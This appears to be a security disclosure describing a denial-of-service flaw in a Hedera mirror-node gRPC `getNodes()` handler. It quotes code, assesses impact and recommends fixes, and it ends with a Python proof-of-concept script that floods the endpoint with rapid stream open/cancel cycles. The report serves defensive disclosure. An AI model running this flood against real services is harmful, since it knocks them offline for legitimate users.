### Title
Unauthenticated gRPC `getNodes()` Stream Churn Enables DB Connection Pool Exhaustion

### Summary
The `getNodes()` handler in `NetworkController` immediately subscribes a reactive pipeline on every incoming call, triggering synchronous database queries before any cancellation can be processed. Because there is no per-IP rate limit or global connection cap on the gRPC service, an unauthenticated attacker can open many connections and rapidly cycle `getNodes()` streams to exhaust the database connection pool and `boundedElastic` thread pool.

### Finding Description

**Exact code path:**

`NetworkController.getNodes()` — [1](#0-0) 

```java
final var disposable = Mono.fromCallable(() -> toFilter(request))
    .flatMapMany(networkService::getNodes)   // ← subscription fires here
    ...
    .subscribe(...);                          // line 38: DB queries execute NOW

if (responseObserver instanceof ServerCallStreamObserver s) {
    s.setOnCancelHandler(disposable::dispose); // line 41: cancel handler set AFTER subscribe
}
```

**Root cause — eager DB queries before cancel handler is armed:**

`NetworkServiceImpl.getNodes()` executes two uncached synchronous DB queries the moment the Flux is subscribed (line 38), before the cancel handler is even registered (line 41): [2](#0-1) 

```java
long addressBookTimestamp = addressBookRepository
    .findLatestTimestamp(fileId.getId())          // uncached DB query
    .orElseThrow(...);
long nodeStakeTimestamp = nodeStakeRepository.findLatestTimestamp()  // uncached DB query
    .orElse(NODE_STAKE_EMPTY_TABLE_TIMESTAMP);
var nodeStakeMap = nodeStakeRepository.findAllStakeByConsensusTimestamp(nodeStakeTimestamp); // cached 24h
```

`findLatestTimestamp` for both the address book and node stake repositories are **not cached** — confirmed by `NodeStakeRepository` where only `findAllStakeByConsensusTimestamp` carries `@Cacheable`: [3](#0-2) 

Each `getNodes()` call therefore unconditionally consumes a DB connection for at least two `SELECT MAX()` queries regardless of how quickly the client cancels.

**Race condition on cancel handler registration:**

There is a window between line 38 (subscribe) and line 41 (setOnCancelHandler). If the client sends RST/cancel during this window, the cancel handler is never registered and the subscription runs to completion, holding a DB connection and a `boundedElastic` scheduler thread for the full paging loop (250 ms page delay × N pages): [4](#0-3) 

**Only mitigation present — insufficient:**

`maxConcurrentCallsPerConnection = 5` limits concurrent streams per TCP connection: [5](#0-4) 

This does not bound the total number of connections. An attacker opens N connections × 5 streams = 5N simultaneous DB-hitting calls. No per-IP connection limit, no global stream cap, and no rate limiter exist in the gRPC module (the `ThrottleConfiguration` / `ThrottleManagerImpl` are in the `web3` module only): [6](#0-5) 

### Impact Explanation

Each rapid open/cancel cycle costs two uncached `SELECT MAX()` DB queries and one reactive subscription allocation. At scale (e.g., 200 connections × 5 streams = 1,000 concurrent calls), the database connection pool is saturated, causing all gRPC calls (including legitimate `subscribeTopic` streams) to queue or fail. The `boundedElastic` thread pool is also exhausted by leaked subscriptions in the cancel-handler race window, degrading the entire mirror-node gRPC service. Severity: **High** (availability impact, no authentication required).

### Likelihood Explanation

Any internet-reachable gRPC endpoint (port 5600) is exploitable with a standard gRPC client library. No credentials, tokens, or special protocol knowledge are needed — only a valid `file_id` (publicly documented as `0.0.101` or `0.0.102`). The attack is trivially scriptable, repeatable, and requires no persistence on the target system.

### Recommendation

1. **Add a gRPC-level rate limiter** (e.g., per-IP token bucket interceptor) applied to `NetworkService/getNodes` in `GrpcConfiguration`, analogous to the `ThrottleManagerImpl` in the `web3` module.
2. **Cache `findLatestTimestamp` calls** in `NodeStakeRepository` and `AddressBookRepository` (short TTL, e.g., 2–5 s) so rapid-fire calls hit the cache rather than the DB.
3. **Fix the cancel-handler race** by checking `isCancelled()` immediately after `subscribe()` and disposing if already cancelled, or by using `ServerCallStreamObserver.setOnReadyHandler` / wrapping in a `Sinks`-based approach that arms the cancel handler before subscribing.
4. **Set a global `maxConcurrentCallsPerConnection` and add a server-wide `maxConnectionAge`** via `NettyServerBuilder` to bound total resource consumption per client.

### Proof of Concept

```python
import grpc
import threading
from hedera.mirror.api.proto import network_service_pb2_grpc
from hedera.mirror.api.proto import network_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc:5600"
NUM_CONNECTIONS = 100
STREAMS_PER_CONN = 5

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = network_service_pb2_grpc.NetworkServiceStub(channel)
    query = network_service_pb2.AddressBookQuery(
        file_id=basic_types_pb2.FileID(fileNum=102)
    )
    for _ in range(1000):
        # Open stream — triggers 2 uncached DB queries immediately
        call = stub.getNodes(query)
        # Cancel immediately — dispose() fires, but DB queries already ran
        call.cancel()
    channel.close()

threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Result: DB connection pool exhausted; legitimate gRPC calls begin failing
```
